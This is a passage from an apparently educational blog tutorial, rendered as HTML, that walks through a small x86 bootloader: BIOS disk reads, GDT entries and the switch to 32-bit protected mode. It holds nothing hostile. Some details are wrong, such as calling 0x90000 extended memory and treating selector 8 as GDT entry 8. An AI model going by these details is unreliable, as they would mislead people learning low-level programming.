data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">jmp\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> $\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>“Jump to current address” - an infinite loop. If we get here, something went wrong. This prevents the CPU from running off into random memory and executing garbage as instructions.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">%\u003C/span>\u003Cspan style=\"color:#F97583\">include\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"disk.asm\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">%\u003C/span>\u003Cspan style=\"color:#F97583\">include\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"gdt.asm\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">%\u003C/span>\u003Cspan style=\"color:#F97583\">include\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"switch2_32bit.asm\"\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>NASM literally copy-pastes these files here. It’s not like C includes - there’s no separate compilation. The assembler just reads these files and inserts their contents at this point.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[bits \u003C/span>\u003Cspan style=\"color:#79B8FF\">16\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">load_kernel:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> bx\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, Kernel_offset\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> dh\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> dl\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, [BOOT_DRIVE]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    call\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> disk_load\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    ret\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This sets up the parameters for \u003Ccode>disk_load\u003C/code> and calls it. We want to load 2 sectors (\u003Ccode>dh = 2\u003C/code>) from the boot drive to address \u003Ccode>0x1000\u003C/code> (\u003Ccode>bx = Kernel_offset\u003C/code>). Why 2 sectors? Because our kernel is small. If it were bigger, we’d load more.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[bits \u003C/span>\u003Cspan style=\"color:#79B8FF\">32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">BEGIN_32BIT:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    call\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> Kernel_offset\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    jmp\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> $\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This code runs after we’ve switched to 32-bit mode. Note the \u003Ccode>[bits 32]\u003C/code> directive - now we’re generating 32-bit instructions. We call the kernel (which is now loaded at \u003Ccode>0x1000\u003C/code>), and if it ever returns (it shouldn’t), we loop forever.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">BOOT_DRIVE \u003C/span>\u003Cspan style=\"color:#F97583\">db\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Storage for the boot drive number. \u003Ccode>db\u003C/code> means “define byte” - reserve one byte of space, initialized to 0.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">times\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 510\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> - ($-$$) \u003C/span>\u003Cspan style=\"color:#F97583\">db\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This is some assembler stuff. \u003Ccode>$\u003C/code> is the current address, \u003Ccode>$$\u003C/code> is the start of the section. So \u003Ccode>($-$$)\u003C/code> is how many bytes we’ve used so far. \u003Ccode>510 - ($-$$)\u003C/code> is how many bytes we have left (out of 512 total, minus 2 for the magic number). \u003Ccode>times\u003C/code> repeats the following instruction that many times. So this pads with zeros until we reach byte 510.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">dw\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0xaa55\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The magic number. \u003Ccode>dw\u003C/code> means “define word” (2 bytes). This writes \u003Ccode>0x55 0xaa\u003C/code> (little-endian) at bytes 510-511. The BIOS checks for this and won’t boot if it’s not there.\u003C/p>\n\u003Ch2 id=\"deep-dive-reading-from-disk\">Deep Dive: Reading From Disk\u003C/h2>\n\u003Cp>\u003Ca href=\"https://wiki.osdev.org/CPU_Registers_x86#CR0\">CPU Registers x86 - CR0 Documentation\u003C/a>\u003C/p>\n\u003Cp>The \u003Ccode>disk.asm\u003C/code> file uses BIOS interrupt 0x13 to read sectors from disk. Interrupts are the way you communicate with the BIOS in real mode. You set up registers with parameters, call \u003Ccode>int 0x13\u003C/code>, and the BIOS does the work.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">disk_load:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    pusha\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    push\u003C/span>\u003Cspan style=\"color:#79B8FF\"> dx\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Save all registers. BIOS interrupts might clobber them, and we want to restore the state afterward. \u003Ccode>pusha\u003C/code> pushes all general-purpose registers at once.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> ah\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x02\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Function 0x02 of interrupt 0x13 is “read sectors”. The function number goes in \u003Ccode>ah\u003C/code>. Different values of \u003Ccode>ah\u003C/code> do different things (0x00 resets the disk controller, 0x03 writes sectors, etc.).\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> al\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">dh\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Number of sectors to read. We put this in \u003Ccode>dh\u003C/code> before calling, now move it to \u003Ccode>al\u003C/code> where the BIOS expects it.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> cl\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x02\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Start reading from sector 2. Sector numbers start at 1 (not 0, because of course they don’t). Sector 1 is our boot sector, so sector 2 is where our kernel starts.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> ch\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x00\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> dh\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x00\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Cylinder 0, head 0. On modern drives, these don’t really correspond to physical geometry anymore, but the BIOS interface still uses this CHS (Cylinder-Head-Sector) addressing. For small bootloaders, we can just use cylinder 0, head 0 and increment sectors.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x13\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Call the BIOS. This actually reads from the disk into memory at \u003Ccode>es:bx\u003C/code>. We have \u003Ccode>bx\u003C/code> set to our kernel offset, and \u003Ccode>es\u003C/code> defaults to 0, so we’re reading to \u003Ccode>0x0000:0x1000\u003C/code> which is just \u003Ccode>0x1000\u003C/code>.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">jc\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> disk_error\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Jump if carry flag is set. The BIOS sets the carry flag if an error occurred. We’d jump to an error handler (which in our case is just an infinite loop).\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">pop\u003C/span>\u003Cspan style=\"color:#79B8FF\"> dx\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">cmp\u003C/span>\u003Cspan style=\"color:#79B8FF\"> al\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">dh\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">jne\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sector_error\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The BIOS returns the number of sectors actually read in \u003Ccode>al\u003C/code>. We compare it to how many we expected (\u003Ccode>dh\u003C/code>, which we saved on the stack). If they don’t match, something went wrong.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">popa\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">ret\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Restore registers and return. If u made it here, the kernel is loaded into memory.\u003C/p>\n\u003Ch2 id=\"the-global-descriptor-table\">The Global Descriptor Table\u003C/h2>\n\u003Cp>Before we can switch to protected mode, we need to set up the GDT..\u003C/p>\n\u003Ch3 id=\"memory-segmentation-why\">Memory Segmentation: Why?\u003C/h3>\n\u003Cp>\u003Cimg src=\"/images/posts/bootloader/4.gif\" alt=\"Memory Segmentation\">\u003C/p>\n\u003Cp>\u003Ca href=\"https://en.wikipedia.org/wiki/Global_Descriptor_Table\">Global Descriptor Table - Wikipedia\u003C/a>\u003C/p>\n\u003Cp>\u003Ca href=\"https://en.wikipedia.org/wiki/Segment_descriptor\">Segment Descriptor - Wikipedia\u003C/a>\u003C/p>\n\u003Cp>In real mode, memory addresses work like this: \u003Ccode>segment:offset\u003C/code>. You have a 16-bit segment register and a 16-bit offset. The actual physical address is \u003Ccode>(segment &#x3C;&#x3C; 4) + offset\u003C/code>. This lets you address 1MB of memory (20 bits) with 16-bit registers.\u003C/p>\n\u003Cp>In protected mode, segments work differently. Instead of shifting and adding, the segment register contains an index into the GDT. Each GDT entry describes a segment: base address, limit, access rights, privilege level.\u003C/p>\n\u003Cp>This gives you:\u003C/p>\n\u003Cul>\n\u003Cli>\u003Cstrong>Memory protection\u003C/strong> - Segments can be marked as read-only, executable, etc.\u003C/li>\n\u003Cli>\u003Cstrong>Privilege levels\u003C/strong> - Ring 0 (kernel) vs Ring 3 (user programs)\u003C/li>\n\u003Cli>\u003Cstrong>More address space\u003C/strong> - Base can be 32-bit, limit can be up to 4GB\u003C/li>\n\u003C/ul>\n\u003Cp>For our simple bootloader, we’re going to set up flat segmentation: one code segment and one data segment, both covering the entire 4GB address space. This is what modern OSes do - real segmentation is basically unused on x86-64. We set it up because the CPU requires it, then ignore it and use paging instead.\u003C/p>\n\u003Ch3 id=\"gdt-structure\">GDT Structure\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">gdt_start:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    dq\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x0\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The first entry must be null. This is a requirement. Any attempt to load a segment register with 0 will cause a fault. It’s a safety feature - if you accidentally use an uninitialized segment register, you get a clear error instead of random behavior.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">gdt_code:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    dw\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0xffff\u003C/span>\u003Cspan style=\"color:#6A737D\">    ; Segment limit, bits 0-15\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    dw\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x0\u003C/span>\u003Cspan style=\"color:#6A737D\">       ; Base address, bits 0-15\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    db\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x0\u003C/span>\u003Cspan style=\"color:#6A737D\">       ; Base address, bits 16-23\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    db\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 10011010b\u003C/span>\u003Cspan style=\"color:#6A737D\"> ; Access byte\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    db\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 11001111b\u003C/span>\u003Cspan style=\"color:#6A737D\"> ; Flags and limit bits 16-19\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    db\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x0\u003C/span>\u003Cspan style=\"color:#6A737D\">       ; Base address, bits 24-31\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>A GDT entry is 8 bytes. The layout is weird because of historical reasons (the original 80286 had a different format, and they extended it for 32-bit while keeping backward compatibility). Let’s break down that access byte:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>10011010b\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>│││││││└─ Accessed bit (CPU sets this when segment is accessed)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>││││││└── Readable (for code) / Writable (for data)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>│││││└─── Executable (1 = code segment, 0 = data segment)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>││││└──── Must be 1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>│││└───── Privilege level (0-3, we use 0 for kernel)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>││└────── Privilege level\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>300: │└─────── Present bit (must be 1)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>So \u003Ccode>10011010b\u003C/code> means: present, privilege 0, must-be-1, executable, readable, not accessed yet.\u003C/p>\n\u003Cp>The flags byte is split:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>11001111b\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>││││└┴┴┴─ Limit bits 16-19\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>│││└───── Available for OS use\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>││└────── Must be 0 (for 32-bit segments)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>│└─────── Size (1 = 32-bit, 0 = 16-bit)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>└──────── Granularity (1 = limit is in 4KB blocks)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>So \u003Ccode>11001111b\u003C/code> means: granularity=1 (4KB blocks), 32-bit, limit bits are all 1. With granularity set and limit=\u003Ccode>0xfffff\u003C/code>, this gives us a 4GB segment (\u003Ccode>0xfffff * 4KB = 4GB\u003C/code>).\u003C/p>\n\u003Cp>The data segment is similar, just with \u003Ccode>10010010b\u003C/code> as the access byte (not executable, writable).\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">gdt_descriptor:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    dw\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> gdt_end - gdt_start - \u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    dd\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> gdt_start\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This is the GDT descriptor that we load with \u003Ccode>lgdt\u003C/code>. It’s 6 bytes: 2-byte size (total bytes minus 1), 4-byte address of the GDT. The CPU needs this to know where the GDT is and how big it is.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">CODE_SEG \u003C/span>\u003Cspan style=\"color:#79B8FF\">equ\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> gdt_code - gdt_start\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">DATA_SEG \u003C/span>\u003Cspan style=\"color:#79B8FF\">equ\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> gdt_data - gdt_start\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>These calculate offsets to our segments. \u003Ccode>CODE_SEG\u003C/code> is 8 (first entry after null), \u003Ccode>DATA_SEG\u003C/code> is 16. These are segment selectors - when we load \u003Ccode>CODE_SEG\u003C/code> into a segment register, the CPU looks at GDT entry 8.\u003C/p>\n\u003Ch2 id=\"switching-to-protected-mode\">Switching to Protected Mode\u003C/h2>\n\u003Cp>\u003Cimg src=\"/images/posts/bootloader/5.gif\" alt=\"Switching to Protected Mode\">\u003C/p>\n\u003Cp>This is the climax ehe .  We’re going to flip one bit in a control register, and the CPU will completely change how it operates.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[bits \u003C/span>\u003Cspan style=\"color:#79B8FF\">16\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">switch_2_32bit:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    cli\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Clear interrupts. BIOS interrupts don’t work in protected mode, and we haven’t set up our own interrupt handlers yet. If an interrupt fires during the transition, bad things happen. So we disable them.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">lgdt\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [gdt_descriptor]\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Load the GDT. This tells the CPU “here’s your new segmentation table”. The CPU doesn’t start using it yet - we’re still in real mode - but it needs to be loaded before we switch.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> eax\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">cr0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">or\u003C/span>\u003Cspan style=\"color:#79B8FF\"> eax\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> cr0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">eax\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Here it is. Control register 0 has a bunch of flags. Bit 0 is PE (Protection Enable). Setting it switches the CPU to protected mode. We read CR0, set bit 0, write it back. The instant that \u003Ccode>mov cr0, eax\u003C/code> executes, we’re in 32-bit protected mode.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">jmp\u003C/span>\u003Cspan style=\"color:#B392F0\"> CODE_SEG:\u003C/span>\u003Cspan style=\"color:#E1E4E8\">init_32bit\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This is a far jump. It does two things:\u003C/p>\n\u003Col>\n\u003Cli>Loads \u003Ccode>CS\u003C/code> (code segment) with \u003Ccode>CODE_SEG\u003C/code>, making the CPU actually start using our GDT\u003C/li>\n\u003Cli>Flushes the instruction pipeline\u003C/li>\n\u003C/ol>\n\u003Cp>The CPU prefetches instructions. Right now the pipeline has 16-bit instructions that were fetched before we switched modes. If we kept executing, we’d be trying to execute 16-bit instructions in 32-bit mode. This causes instant crashes. The far jump clears the pipeline and forces the CPU to refetch from the new address, now interpreting everything as 32-bit code.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[bits \u003C/span>\u003Cspan style=\"color:#79B8FF\">32\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">init_32bit:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> ax\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, DATA_SEG\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> ds\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">ax\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> ss\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">ax\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> es\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">ax\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> fs\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">ax\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> gs\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">ax\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Load all segment registers with our data segment. In protected mode, you can’t use segments that aren’t in the GDT. We load them all with \u003Ccode>DATA_SEG\u003C/code> so memory accesses work correctly.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> ebp\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x90000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> esp\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">ebp\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Set up a new stack. We use \u003Ccode>0x90000\u003C/code> (576KB) which is well into extended memory. 